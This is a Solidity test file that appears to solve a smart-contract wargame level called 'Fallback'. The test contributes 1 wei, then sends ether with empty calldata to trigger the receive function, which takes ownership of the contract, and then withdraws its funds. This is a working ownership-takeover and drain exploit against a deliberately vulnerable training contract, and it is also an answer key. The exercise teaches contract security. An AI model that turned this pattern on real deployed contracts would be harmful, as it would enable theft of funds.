// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../contracts/utils/TestWithSetup.sol";
import "../contracts/1Fallback.sol";

contract FallbackTest is TestWithSetup {
    Fallback public contractToTest;

    function setUp() public override {
        TestWithSetup.setUp();
        vm.prank(owner);
        contractToTest = new Fallback();
        vm.startPrank(user);
    }

    function testSolution() public {
        assertEq(contractToTest.getContribution(), 0);
        // sends initial contribute
        contractToTest.contribute{value: 1 wei}();
        assertEq(contractToTest.getContribution(), 1 wei);
        assertEq(contractToTest.owner(), owner);
        // payable(contractToTest).transfer(100 wei); //should work
        // send transaction with empty calldata and ether value to invoke fallback function reveice()
        address(contractToTest).call{value: 1 wei}("");
        // prove ownership has transferred
        assertEq(contractToTest.owner(), user);
        // now that we are the owner, return recieved funds
        contractToTest.withdraw();
    }
}
